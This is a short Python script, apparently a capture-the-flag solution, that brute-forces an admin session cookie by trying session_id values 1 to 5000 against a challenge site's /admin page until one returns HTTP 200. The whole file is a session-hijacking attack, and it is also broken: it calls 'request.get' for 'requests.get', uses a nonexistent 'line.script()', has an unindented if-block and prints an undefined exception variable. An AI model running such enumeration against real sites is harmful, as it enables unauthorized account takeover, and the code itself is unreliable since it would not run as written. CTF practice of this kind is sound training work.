import requests
#brute force of the admin cookie/session_id

URL= "http://too-small-reminder.challs.olicyber.it/admin"

START=1
END=5000

for session_id in range(START, END, 1):
  cookies = {"session_id": str(session_id)}

  try:
    r = request.get(URL, cookies=cookies, timeout=5)
    status = r.status_code
    line = f"session_id={session_id} | status={status}"
    print(line.script())

    if status == 200: 
    print(f"Cookie: {session_id}")
    break

  except Exception as err:
    print(f"errore: {e}")
